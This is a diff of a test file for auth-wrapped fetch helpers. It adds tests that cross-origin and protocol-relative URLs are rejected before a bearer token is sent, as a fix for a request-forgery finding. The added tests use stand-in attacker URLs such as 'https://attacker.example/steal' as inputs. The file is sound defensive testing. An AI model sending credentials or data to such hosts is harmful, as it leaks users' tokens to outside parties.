@@ -38,7 +38,7 @@ describe("fetchRawWithAuth", () => {
   it("returns the response directly on success (no retry)", async () => {
     fetchMock.mockResolvedValueOnce(jsonResponse(200, { data: "ok" }));
 
-    const res = await fetchRawWithAuth("http://api.test/export/123");
+    const res = await fetchRawWithAuth("/api/export/123");
 
     expect(res.status).toBe(200);
     expect(fetchMock).toHaveBeenCalledTimes(1);
@@ -51,7 +51,7 @@ describe("fetchRawWithAuth", () => {
       .mockResolvedValueOnce(jsonResponse(200, { data: "ok-after-retry" }));
     mockSilentRefresh.mockResolvedValue("refreshed-token");
 
-    const res = await fetchRawWithAuth("http://api.test/export/123");
+    const res = await fetchRawWithAuth("/api/export/123");
 
     expect(res.status).toBe(200);
     expect(fetchMock).toHaveBeenCalledTimes(2);
@@ -66,7 +66,7 @@ describe("fetchRawWithAuth", () => {
     fetchMock.mockResolvedValueOnce(jsonResponse(401));
     mockSilentRefresh.mockResolvedValue(null);
 
-    const res = await fetchRawWithAuth("http://api.test/export/123");
+    const res = await fetchRawWithAuth("/api/export/123");
 
     expect(res.status).toBe(401);
     expect(fetchMock).toHaveBeenCalledTimes(1);
@@ -91,9 +91,51 @@ describe("fetchWithAuth 401 error shape", () => {
   });
 
   it("throws an error with isAuthError=true on 401, for authProvider.onError's auto-logout check", async () => {
-    await expect(fetchWithAuth("http://api.test/thing")).rejects.toMatchObject({
+    await expect(fetchWithAuth("/api/thing")).rejects.toMatchObject({
       status: 401,
       isAuthError: true,
     });
+  });
+});
+
+describe("cross-origin URL rejection (CodeQL: server-side request forgery)", () => {
+  let fetchMock: ReturnType<typeof vi.fn>;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    mockGetUser.mockResolvedValue({ access_token: "secret-token" });
+    fetchMock = vi.fn().mockResolvedValue(jsonResponse(200, { data: "ok" }));
+    vi.stubGlobal("fetch", fetchMock);
+  });
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+  });
+
+  it("fetchWithAuth refuses a cross-origin URL and never attaches the bearer token", async () => {
+    await expect(
+      fetchWithAuth("https://attacker.example/steal"),
+    ).rejects.toThrow(/cross-origin/i);
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it("fetchRawWithAuth refuses a cross-origin URL and never attaches the bearer token", async () => {
+    await expect(
+      fetchRawWithAuth("https://attacker.example/steal"),
+    ).rejects.toThrow(/cross-origin/i);
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it("fetchWithAuth allows a root-relative same-origin path", async () => {
+    const res = await fetchWithAuth("/api/thing");
+    expect(res).toEqual({ data: "ok" });
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+  });
+
+  it("fetchWithAuth refuses a protocol-relative URL (// is a different host)", async () => {
+    await expect(fetchWithAuth("//attacker.example/steal")).rejects.toThrow(
+      /cross-origin/i,
+    );
+    expect(fetchMock).not.toHaveBeenCalled();
   });
 });
